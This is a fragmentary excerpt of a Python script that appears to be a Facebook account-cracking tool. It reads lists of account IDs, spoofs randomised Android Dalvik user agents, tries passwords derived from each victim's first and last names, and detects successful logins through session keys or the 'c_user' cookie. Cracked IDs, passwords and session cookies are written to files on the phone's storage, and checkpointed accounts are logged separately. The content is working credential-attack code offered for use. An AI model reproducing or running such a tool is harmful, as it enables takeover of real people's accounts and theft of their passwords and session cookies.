...
def randBuildLSB():
    ...
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/R16NW.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua
...
\033[1;37           
\033[1;37m------------------------------------------------
\033[1;37m\033[95m Facebook   :            Kmatcho Al-lhontkor
...
class main_crack():
    ...
    def crack(self,id):
        global methods
        clear()
        self.file = input('    \033[37mPut File Name : ')
        try:
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [AKM-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/AKM_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/NALUTY_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [SK MH-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/AKM_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[AKM-M1] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[AKM-M2] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[AKM-M2] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [AKM-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/AKM_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
